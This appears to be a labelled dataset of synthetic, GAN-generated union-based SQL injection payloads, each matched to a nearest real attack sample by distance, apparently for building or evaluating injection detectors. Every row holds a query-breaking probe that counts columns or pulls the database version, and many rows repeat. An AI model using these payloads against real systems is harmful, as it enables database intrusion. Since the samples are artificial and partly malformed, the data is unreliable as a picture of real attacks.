id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000203,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000051,5.314558419689517
CTGAN_000204,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,9.271409201201331
CTGAN_000205,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000127,6.6881589595849995
CTGAN_000206,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000222,5.527544892119183
CTGAN_000207,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,5.4852147348030265
CTGAN_000208,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000013,5.53017795835702
CTGAN_000209,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000244,13.505265080959706
CTGAN_000210,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,5.764728815869946
CTGAN_000211,attack,union,"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000117,4.557950378174124
CTGAN_000212,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000100,5.067846751034977
CTGAN_000213,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000036,6.987248649012168
CTGAN_000214,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,4.738320258804904
CTGAN_000215,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000088,5.998143302979825
CTGAN_000216,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000251,5.436071559600368
CTGAN_000217,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000176,6.050779422716517
CTGAN_000218,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000303,4.5761675832178295
CTGAN_000219,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,10.70511604138415
CTGAN_000220,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000242,7.792609090247438
CTGAN_000221,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000241,4.484892133007264
CTGAN_000222,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000251,6.335718300150151
CTGAN_000223,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,8.073253165765829
CTGAN_000224,attack,union,"-2500'   )    )     )   union all select 6853,6853,6853,6853--",nearest_attack_euclidean,R000296,5.062818363910568
CTGAN_000225,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000227,4.179830778972071
CTGAN_000226,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,5.650842745343548
CTGAN_000227,attack,union,"1 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000276,6.826439495287642
CTGAN_000228,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000194,7.093275024747746
CTGAN_000229,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,6.471649707297382
CTGAN_000230,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000303,3.2974980523143698
CTGAN_000231,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,5.122252473338234
CTGAN_000232,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000036,6.395931832659413
CTGAN_000233,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000085,6.10068919803642
CTGAN_000234,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,5.116548849106504
CTGAN_000235,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000194,7.5507101681429765
CTGAN_000236,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,5.247949359960336
CTGAN_000237,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000222,6.091498053351499
CTGAN_000238,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000127,6.13274850784352
CTGAN_000239,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,5.253462437823098
CTGAN_000240,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,4.929712893386101
CTGAN_000241,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,6.059146925028986
CTGAN_000242,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,5.594709059041582
CTGAN_000243,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000023,8.933196151861317
CTGAN_000244,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000242,5.707121507916058
CTGAN_000245,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,6.719123281195483
CTGAN_000246,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000157,5.45354740229351
CTGAN_000247,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,7.545015882181858
CTGAN_000248,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,5.06535540730086
CTGAN_000249,attack,union,"1""   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000198,4.407936950933852
CTGAN_000250,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,5.199474666861173
CTGAN_000251,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000222,5.019620062013422
CTGAN_000252,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000207,4.86547736038052
CTGAN_000253,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000240,4.989168323840334
CTGAN_000254,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000238,5.558675900929435
CTGAN_000255,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R000273,6.383479956779134
CTGAN_000256,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000100,3.408558665673545
CTGAN_000257,attack,union,"1"" where 1452  =  1452 union all select null,null,null,null--",nearest_attack_euclidean,R000152,5.873079707145425
CTGAN_000258,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,9.639360337933377
CTGAN_000259,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000194,7.519807429295745
CTGAN_000260,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,4.557265841044333
CTGAN_000261,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000218,4.471116328655781
CTGAN_000262,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000013,8.698534377829416
CTGAN_000263,attack,union,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",nearest_attack_euclidean,R000169,7.263877494629409
CTGAN_000264,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000221,4.324230534085017
CTGAN_000265,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000260,5.942997466597766
CTGAN_000266,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000087,5.99769743889671
CTGAN_000267,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000087,6.8132580879236535
CTGAN_000268,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000013,5.77015073746776
CTGAN_000269,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,8.39355045348331
CTGAN_000270,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,3.676519921437836
CTGAN_000271,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,5.84261015172003
CTGAN_000272,attack,union,"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",nearest_attack_euclidean,R000053,4.8642484493404465
CTGAN_000273,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000085,5.302966144791108
CTGAN_000274,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000105,6.15513461033825
CTGAN_000275,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,6.151544820615647
CTGAN_000276,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000064,5.997479458513305
CTGAN_000277,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,6.243286544448318
CTGAN_000278,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000228,5.577449452958971
CTGAN_000279,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000188,4.979924641415456
CTGAN_000280,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000232,7.640870142817238
CTGAN_000281,attack,union,"-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#",nearest_attack_euclidean,R000253,5.244178476890137
CTGAN_000282,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000127,5.420168519312029
CTGAN_000283,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000214,8.53686234187849
CTGAN_000284,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,4.759199492102601
CTGAN_000285,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,5.13235359671838
CTGAN_000286,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,7.299752415314604
CTGAN_000287,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000079,4.819058412351991
CTGAN_000288,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000051,4.95682135777379
CTGAN_000289,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000065,6.391382085652956
CTGAN_000290,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,6.519602309921722
CTGAN_000291,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000176,4.9019998699571685
CTGAN_000292,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000067,4.3788047291977925
CTGAN_000293,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000064,5.977218001864368
CTGAN_000294,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,5.940813282453835
CTGAN_000295,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000288,5.895598456687511
CTGAN_000296,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,4.406135238416684
CTGAN_000297,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000288,5.573464979356654
CTGAN_000298,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000071,5.951919698976397
CTGAN_000299,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,5.737711926221719
CTGAN_000300,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000237,4.5300233828906284
CTGAN_000301,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,7.8944915130940325
CTGAN_000302,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,7.125049407718506
CTGAN_000303,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000222,8.311859724696067
CTGAN_000304,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000201,4.851825971492642
CTGAN_000305,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,11.169689198665047
CTGAN_000306,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000288,5.754368355218888
CTGAN_000307,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000213,6.936497918970746
CTGAN_000308,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000065,7.461696904930249
CTGAN_000309,attack,union,"1%""   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000057,6.326414263113626
CTGAN_000310,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,6.021674552615265
CTGAN_000311,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,5.658374781481676
CTGAN_000312,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,7.1668151523613135
CTGAN_000313,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000072,5.626564340232324
CTGAN_000314,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000115,6.104491401734774
CTGAN_000315,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,8.821148057889594
CTGAN_000316,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,5.683758191877039
CTGAN_000317,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,6.321162893679842
CTGAN_000318,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000023,6.897603075012037
CTGAN_000319,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,5.927610181337974
CTGAN_000320,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000262,5.5859511110688125
CTGAN_000321,attack,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",nearest_attack_euclidean,R000096,6.33344060894728
CTGAN_000322,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,6.566990363887992
CTGAN_000323,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000305,5.181208692382717
CTGAN_000324,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,5.99210149501926
CTGAN_000325,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,9.512259026727918
CTGAN_000326,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,4.686548721815554
CTGAN_000327,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000077,6.250281256648381
CTGAN_000328,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,7.886690281862017
CTGAN_000329,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,4.891356354485656
CTGAN_000330,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000213,6.000974624516516
CTGAN_000331,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,6.876131155509532
CTGAN_000332,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,6.455128706622624
CTGAN_000333,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000021,9.579068551730368
CTGAN_000334,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000076,5.457569894146917
CTGAN_000335,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,7.344001654750894
CTGAN_000336,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,9.965881721121558
CTGAN_000337,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000201,6.789532603155067
CTGAN_000338,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000242,8.674461491003106
CTGAN_000339,attack,union,"1  )   as azdb where 4219  =  4219 union all select null,null,null,null#",nearest_attack_euclidean,R000217,10.254935782083232
CTGAN_000340,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,5.625442913699631
CTGAN_000341,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,8.162710142767569
CTGAN_000342,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,5.92135687460197
CTGAN_000343,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000021,8.73558099738289
CTGAN_000344,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,5.7405803190922455
CTGAN_000345,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000303,5.921019227248396
CTGAN_000346,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R000284,6.293297018898713
CTGAN_000347,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,9.569084158945417
CTGAN_000348,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,7.461546414841272
CTGAN_000349,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R000284,4.74849061311722
CTGAN_000350,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000201,5.061119028825428
CTGAN_000351,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000288,4.975116510494116
CTGAN_000352,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,7.787485259315866
CTGAN_000353,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000013,7.875532750394935
CTGAN_000354,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000244,14.13109386474003
CTGAN_000355,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,6.216310575898685
CTGAN_000356,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,5.505044074268827
CTGAN_000357,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000078,6.769605227894928
CTGAN_000358,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,6.337495831998112
CTGAN_000359,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000221,3.938295743991021
CTGAN_000360,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R000284,13.016817439728962
CTGAN_000361,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000252,8.24304134216582
CTGAN_000362,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R000274,5.915117282245466
CTGAN_000363,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000077,5.914786581630459
CTGAN_000364,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000088,7.496883794941871
CTGAN_000365,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,5.620477205991778
CTGAN_000366,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,5.825001339011452
CTGAN_000367,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000220,5.583984988970538
CTGAN_000368,attack,union,"-3361   )    )    union all select 2827,2827,2827,2827#",nearest_attack_euclidean,R000056,6.585007529182979
CTGAN_000369,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000194,6.889987971653442
CTGAN_000370,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,4.923199253703815
CTGAN_000371,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R000119,5.713447698825869
CTGAN_000372,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000014,10.209291721348508
CTGAN_000373,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000308,8.747830266299195
CTGAN_000374,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000211,5.545953203962285
CTGAN_000375,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,10.177496306591454
CTGAN_000376,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000021,8.290265305934001
CTGAN_000377,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000127,5.7087609598885365
CTGAN_000378,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,5.095442018855367
CTGAN_000379,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000218,6.522174271668899
CTGAN_000380,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R000272,5.626667669453607
CTGAN_000381,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,6.898584093102791
CTGAN_000382,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,6.636162805871488
CTGAN_000383,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,9.151447743792184
CTGAN_000384,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,4.775944013903473
CTGAN_000385,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000013,6.628810516650713
CTGAN_000386,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,4.145688625572547
CTGAN_000387,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,6.371226070880958
CTGAN_000388,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000240,5.303272314735679
CTGAN_000389,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,7.123447322123983
CTGAN_000390,attack,union,"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",nearest_attack_euclidean,R000074,5.363724913551022
CTGAN_000391,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000111,5.107306586086666
CTGAN_000392,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,9.334270180154839
CTGAN_000393,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,6.200125477492594
CTGAN_000394,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000201,5.203067683906222
CTGAN_000395,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000310,5.38775699655515
CTGAN_000396,attack,union,"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",nearest_attack_euclidean,R000270,6.553359170541089
CTGAN_000397,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,5.70541720963311
CTGAN_000398,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000061,8.341240978998595
CTGAN_000399,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,5.383537092188147
CTGAN_000400,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000103,5.480494143553837
CTGAN_000401,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000269,4.37156767278169
CTGAN_000402,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,6.433672660804094
CTGAN_000403,attack,union,"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",nearest_attack_euclidean,R000259,5.136743579655438
CTGAN_000404,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000213,7.351431351127516
CTGAN_000405,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,5.168995785997124
